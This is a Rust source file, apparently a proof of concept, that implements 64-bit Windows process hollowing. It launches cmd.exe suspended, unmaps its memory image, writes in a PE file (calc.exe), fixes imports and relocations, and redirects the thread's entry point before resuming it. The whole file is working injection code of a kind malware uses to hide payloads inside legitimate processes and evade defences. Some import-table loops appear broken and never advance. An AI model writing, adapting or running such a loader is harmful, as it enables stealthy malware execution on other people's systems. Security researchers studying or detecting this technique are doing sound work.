#![allow(dead_code, unused_variables, non_snake_case, non_camel_case_types)]
mod types;

use crate::types::*;
use anyhow::Result;
use std::fs::File;
use std::io;
use std::io::Read;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{
    VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtectEx, WriteProcessMemory,
};
use winapi::um::processthreadsapi::{
    CreateProcessA, GetCurrentProcess, GetThreadContext, ResumeThread, SetThreadContext,
    PROCESS_INFORMATION, STARTUPINFOA,
};
use winapi::um::winnt::{CONTEXT, CONTEXT_INTEGER};
use winapi::{ctypes::c_void, um::memoryapi::ReadProcessMemory};

pub fn process_hollow64(
    prochandle: *mut c_void,
    mut remotebase: *mut c_void,
    buffer: Vec<u8>,
    threadhandle: *mut c_void,
) {
    use ntapi::ntmmapi::NtUnmapViewOfSection;

    let headerssize = get_headers_size(&buffer);
    let imagesize = get_image_size(&buffer);

    unsafe {
        let localbaseaddress = VirtualAlloc(std::ptr::null_mut(), imagesize, 0x1000, 0x40);

        NtUnmapViewOfSection(prochandle, remotebase);

        remotebase =
            VirtualAllocEx(prochandle, remotebase, imagesize, 0x1000 + 0x2000, 0x40) as *mut c_void;
        let mut oldprotect = 0;
        VirtualProtectEx(prochandle, remotebase, imagesize, 0x40, &mut oldprotect);

        // written headers to remote process
        WriteProcessMemory(
            prochandle,
            remotebase,
            buffer.as_ptr() as *const c_void,
            headerssize,
            std::ptr::null_mut(),
        );

        // parsing locally
        std::ptr::copy(
            buffer.as_ptr(),
            localbaseaddress as *mut u8,
            headerssize,
        );

        let mut dosheader: IMAGE_DOS_HEADER = std::mem::zeroed();
        fill_structure_from_memory(
            &mut dosheader,
            localbaseaddress as *const c_void,
            GetCurrentProcess(),
        );

        let mut ntheader = IMAGE_NT_HEADERS64::default();
        fill_structure_from_memory(
            &mut ntheader,
            (localbaseaddress as usize + dosheader.e_lfanew as usize) as *const c_void,
            GetCurrentProcess(),
        );

        let mut sections: Vec<IMAGE_SECTION_HEADER> =
            vec![IMAGE_SECTION_HEADER::default(); ntheader.FileHeader.NumberOfSections as usize];

        // mapping sections in remote process
        for i in 0..sections.len() {
            fill_structure_from_memory(
                &mut sections[i],
                (localbaseaddress as usize
                    + dosheader.e_lfanew as usize
                    + size_of_val(&ntheader)
                    + (i * size_of::<IMAGE_SECTION_HEADER>()))
                    as *const c_void,
                GetCurrentProcess(),
            );

            let temp: Vec<u8> = buffer[sections[i].PointerToRawData as usize
                ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                .to_vec();

            WriteProcessMemory(
                GetCurrentProcess(),
                (localbaseaddress as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                temp.as_ptr() as *const c_void,
                sections[i].SizeOfRawData as usize,
                std::ptr::null_mut(),
            );

            WriteProcessMemory(
                prochandle,
                (remotebase as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                temp.as_ptr() as *const c_void,
                sections[i].SizeOfRawData as usize,
                std::ptr::null_mut(),
            );
        }

        // fixing IAT

        if ntheader.OptionalHeader.ImportTable.Size > 0 {
            let mut ogfirstthunkptr = localbaseaddress as usize
                + ntheader.OptionalHeader.ImportTable.VirtualAddress as usize;

            loop {
                let mut import = IMAGE_IMPORT_DESCRIPTOR::default();

                fill_structure_from_memory(&mut import, ogfirstthunkptr as *const c_void, prochandle);

                if import.Name == 0 && import.FirstThunk == 0 {
                    break;
                }

                let dllname = read_string_from_memory(
                    (localbaseaddress as usize + import.Name as usize) as *const u8,
                    GetCurrentProcess(),
                );

                //println!("DLL Name: {}",dllname);
                let dllhandle = LoadLibraryA(dllname.as_bytes().as_ptr() as *const i8);

                let mut thunkptr = localbaseaddress as usize
                    + import.Characteristics_or_OriginalFirstThunk as usize;

                let mut i = 0;

                loop {
                    let mut thunkdata = MY_IMAGE_THUNK_DATA64::default();

                    fill_structure_from_memory(
                        &mut thunkdata,
                        thunkptr as *const c_void,
                        GetCurrentProcess(),
                    );

                    if thunkdata.address == [0; 8]
                        && u64::from_ne_bytes(thunkdata.address.try_into().unwrap())
                        < 0x8000000000000000
                    {
                        break;
                    }

                    ////println!("thunkdata: {:x?}",thunkdata);
                    let offset = u64::from_ne_bytes(thunkdata.address.try_into().unwrap());

                    let funcname = read_string_from_memory(
                        (localbaseaddress as usize + offset as usize + 2) as *const u8,
                        GetCurrentProcess(),
                    );

                    //println!("function name: {}",funcname);

                    if funcname != "" {
                        let funcaddress =
                            GetProcAddress(dllhandle, funcname.as_bytes().as_ptr() as *const i8);

                        let finalvalue = i64::to_ne_bytes(funcaddress as i64);

                        WriteProcessMemory(
                            GetCurrentProcess(),
                            (localbaseaddress as usize + import.FirstThunk as usize + (i * 8))
                                as *mut c_void,
                            finalvalue.as_ptr() as *const c_void,
                            finalvalue.len(),
                            std::ptr::null_mut(),
                        );

                        WriteProcessMemory(
                            prochandle,
                            (remotebase as usize + import.FirstThunk as usize + (i * 8))
                                as *mut c_void,
                            finalvalue.as_ptr() as *const c_void,
                            finalvalue.len(),
                            std::ptr::null_mut(),
                        );
                    }
                }

                i += 1;

                thunkptr += 8;
                println!("{}", i);
                println!("{}", thunkptr);
            }
            ogfirstthunkptr += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
            println!("{}", ogfirstthunkptr);
        }


        // fixing base relocations
        if ntheader.OptionalHeader.BaseRelocationTable.Size > 0 {
            let diffaddress = remotebase as usize - ntheader.OptionalHeader.ImageBase as usize;
            let mut relocptr = localbaseaddress as usize
                + ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;

            loop {
                let mut reloc1 = MY_IMAGE_BASE_RELOCATION::default();

                fill_structure_from_memory(
                    &mut reloc1,
                    relocptr as *const c_void,
                    GetCurrentProcess(),
                );

                if reloc1.SizeofBlock == 0 {
                    break;
                }

                //println!("page rva: {:x?}",reloc1.VirtualAddress);
                //println!("block size: {:x?}",reloc1.SizeofBlock);

                let entries = (reloc1.SizeofBlock - 8) / 2;

                //println!("entries: {:x?}",entries);

                for i in 0..entries {
                    let mut relocoffset: [u8; 2] = [0; 2];

                    ReadProcessMemory(
                        GetCurrentProcess(),
                        (relocptr + 8 + (i * 2) as usize) as *const c_void,
                        relocoffset.as_mut_ptr() as *mut c_void,
                        2,
                        std::ptr::null_mut(),
                    );

                    let temp = u16::from_ne_bytes(relocoffset.try_into().unwrap());

                    ////println!("{:x?}",temp&0x0fff);

                    let type1 = temp >> 12;
                    if type1 == 0xA {
                        // 1&0=0  0&0=0
                        let finaladdress = remotebase as usize
                            + reloc1.VirtualAddress as usize
                            + (temp & 0x0fff) as usize;

                        let mut ogaddress: [u8; 8] = [0; 8];

                        ReadProcessMemory(
                            GetCurrentProcess(),
                            finaladdress as *const c_void,
                            ogaddress.as_mut_ptr() as *mut c_void,
                            8,
                            std::ptr::null_mut(),
                        );

                        let fixedaddress = isize::from_ne_bytes(ogaddress.try_into().unwrap())
                            + diffaddress as isize;

                        WriteProcessMemory(
                            prochandle,
                            finaladdress as *mut c_void,
                            fixedaddress.to_ne_bytes().as_ptr() as *const c_void,
                            8,
                            std::ptr::null_mut(),
                        );
                    }
                }

                relocptr += reloc1.SizeofBlock as usize;
            }
        }

        let mut ctx = std::mem::zeroed::<CONTEXT>();

        ctx.ContextFlags = CONTEXT_INTEGER;

        GetThreadContext(threadhandle, &mut ctx);

        ctx.Rcx = remotebase as u64 + ntheader.OptionalHeader.AddressOfEntryPoint as u64;

        SetThreadContext(threadhandle, &mut ctx);

        VirtualFree(localbaseaddress, 0, 0x00008000);
    }
}

pub fn get_process_image_base(prochandle: *mut c_void) -> i64 {
    unsafe {
        use ntapi::ntpsapi::*;

        let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

        let mut returnlength = 0;
        NtQueryInformationProcess(
            prochandle,
            0,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut returnlength,
        );

        let mut baseaddr: [u8; 8] = [0; 8];

        ReadProcessMemory(
            prochandle,
            (pbi.PebBaseAddress as usize + 0x10) as *const c_void,
            baseaddr.as_mut_ptr() as *mut c_void,
            8,
            std::ptr::null_mut(),
        );

        let imagebase = i64::from_ne_bytes(baseaddr.try_into().unwrap());

        imagebase
    }
}

pub fn fill_structure_from_array<T, U>(base: &mut T, arr: &[U]) -> usize {
    unsafe {
        let handle = GetCurrentProcess();
        let mut byteswritten = 0;
        let res = WriteProcessMemory(
            handle,
            base as *mut _ as *mut c_void,
            arr as *const _ as *const c_void,
            size_of::<T>(),
            &mut byteswritten,
        );

        if res == 0 {
            let os_error = io::Error::last_os_error();
            println!("❌ fill_structure_from_array WriteProcessMemory failed.");
            println!("   错误信息: {}", os_error);
        }

        byteswritten
    }
}

pub fn fill_structure_from_memory<T>(
    dest: &mut T,
    src: *const c_void,
    prochandle: *mut c_void,
) -> usize {
    unsafe {
        let bytestoread: usize = size_of::<T>();
        // println!("size of structure is {}",bytestoread);
        let mut buffer: Vec<u8> = vec![0; bytestoread];
        let mut byteswritten = 0;

        let res = ReadProcessMemory(
            prochandle,
            src,
            buffer.as_mut_ptr() as *mut c_void,
            bytestoread,
            &mut byteswritten,
        );
        if res == 0 {
            let os_error = io::Error::last_os_error();
            println!("❌ fill_structure_from_memory ReadProcessMemory failed.");
            println!("   错误信息: {}", os_error);
        }


        // println!("array being filled: {:x?}",&buffer);
        fill_structure_from_array(dest, &buffer);

        byteswritten
    }
}

pub fn get_headers_size(buffer: &Vec<u8>) -> usize {
    if buffer.len() < 2 {
        panic!("file size is less than 2")
    }
    let magic = &buffer[0..2];
    let magicstring = String::from_utf8_lossy(magic);
    if magicstring == "MZ" {
        if buffer.len() < 64 {
            panic!("file size is less than 64")
        }
        let ntoffset = &buffer[60..64];
        unsafe {
            let offset = std::ptr::read(ntoffset.as_ptr() as *const i32) as usize;

            let bitversion = &buffer[offset + 4 + 20..offset + 4 + 20 + 2];
            let bit = std::ptr::read(bitversion.as_ptr() as *const u16);
            if bit == 523 {
                let index = offset + 24 + 60;
                let headerssize = &buffer[index..index + 4];
                let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                //println!("size of headers: {:x?}",size);
                size as usize
            } else if bit == 267 {
                let index = offset + 24 + 60;
                let headerssize = &buffer[index..index + 4];
                let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                //println!("size of headers: {:x?}",size);
                return size as usize;
            } else {
                panic!("invalid bit version");
            }
        }
    } else {
        panic!("its not a pe file");
    }
}

pub fn get_image_size(buffer: &Vec<u8>) -> usize {
    if buffer.len() < 2 {
        panic!("file size is less than 2")
    }
    let magic = &buffer[0..2];
    let magicstring = String::from_utf8_lossy(magic);
    if magicstring == "MZ" {
        if buffer.len() < 64 {
            panic!("file size is less than 64")
        }
        let ntoffset = &buffer[60..64];
        unsafe {
            let offset = std::ptr::read(ntoffset.as_ptr() as *const i32) as usize;

            let bitversion = &buffer[offset + 4 + 20..offset + 4 + 20 + 2];
            let bit = std::ptr::read(bitversion.as_ptr() as *const u16);
            if bit == 523 {
                let index = offset + 24 + 60 - 4;
                let headerssize = &buffer[index..index + 4];
                let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                //println!("size of image: {:x?}",size);
                size as usize
            } else if bit == 267 {
                let index = offset + 24 + 60 - 4;
                let headerssize = &buffer[index..index + 4];
                let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                //println!("size of image: {:x?}",size);
                return size as usize;
            } else {
                panic!("invalid bit version");
            }
        }
    } else {
        panic!("its not a pe file");
    }
}

pub fn read_string_from_memory(baseaddress: *const u8, phandle: *mut c_void) -> String {
    let mut temp: Vec<u8> = vec![0; 100];
    let mut bytesread: usize = 0;
    unsafe {
        let mut i = 0;
        loop {
            let res = ReadProcessMemory(
                phandle,
                (baseaddress as isize + i) as *const c_void,
                (temp.as_mut_ptr() as usize + i as usize) as *mut c_void,
                1,
                &mut bytesread,
            );

            if res == 0 {
                let os_error = io::Error::last_os_error();
                println!("❌ read_string_from_memory ReadProcessMemory failed.");
                println!("   错误信息: {}", os_error);
            }


            if temp[i as usize] == 0 {
                // //println!("{:x?}",i);
                break;
            }
            i += 1;
        }
        let dllname = String::from_utf8_lossy(&temp);
        dllname.to_string()
    }
}

fn main() -> Result<()> {
    let processname = "C:\\Windows\\System32\\cmd.exe\0";
    unsafe {
        let mut buffer: Vec<u8> = Vec::new();
        let mut fd = File::open(r#"calc.exe"#)?;
        fd.read_to_end(&mut buffer)?;

        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = size_of::<STARTUPINFOA>() as u32;

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let res = CreateProcessA(
            processname.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x00000004,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );

        if res == 0 {
            let os_error = io::Error::last_os_error();
            println!("❌ main CreateProcessA failed.");
            println!("   错误信息: {}", os_error);
        }

        let imagebase = get_process_image_base(pi.hProcess);

        process_hollow64(pi.hProcess, imagebase as *mut c_void, buffer, pi.hThread);

        let res = ResumeThread(pi.hThread);
    }
    Ok(())
}
